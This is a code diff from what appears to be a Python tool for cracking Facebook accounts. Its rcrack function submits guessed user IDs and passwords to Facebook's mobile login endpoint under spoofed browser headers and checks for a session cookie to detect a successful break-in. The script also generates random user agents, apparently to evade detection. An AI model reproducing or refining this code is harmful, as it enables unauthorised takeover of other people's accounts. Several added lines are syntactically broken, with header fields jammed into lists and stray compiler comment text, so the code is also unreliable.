@@ -152,8 +152,8 @@ def dynamic(text):
         sys.stdout.flush();time.sleep(1)
 
 #User agents
-ugen2=['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36']
-ugen=['Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5']
+ugen2=['Mozilla/5.0 (Symbian/3; Series60/3.8 Nokia9121/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.1.1.2 Mobile Safari/535.1', 'accept-encoding': 'gzip, deflate br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Connection': 'keep-alive', 'Host': 'm.facebook.com', 'upgrade-insecure-requests': '1', 'dnt': '1', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-user': 'empty', 'sec-fetch-dest': 'document', 'referer': 'https://m.facebook.com/', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8']
+ugen=['Mozilla/5.0 (Symbian/3; Series60/3.8 Nokia9121/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.1.1.2 Mobile Safari/535.1', 'accept-encoding': 'gzip, deflate br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Connection': 'keep-alive', 'Host': 'm.facebook.com', 'upgrade-insecure-requests': '1', 'dnt': '1', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-user': 'empty', 'sec-fetch-dest': 'document', 'referer': 'https://m.facebook.com/', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8']
 for xd in range(10000):
     aa='Mozilla/5.0 (Linux; U; Android'
     b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
@@ -285,7 +285,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Symbian/3; Series60/3.8 Nokia9121/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.1.1.2 Mobile Safari/535.1', 'accept-encoding': 'gzip, deflate br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Connection': 'keep-alive', 'Host': 'm.facebook.com', 'upgrade-insecure-requests': '1', 'dnt': '1', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-user': 'empty', 'sec-fetch-dest': 'document', 'referer': 'https://m.facebook.com/', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
+            'user-agent': pro}
             lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
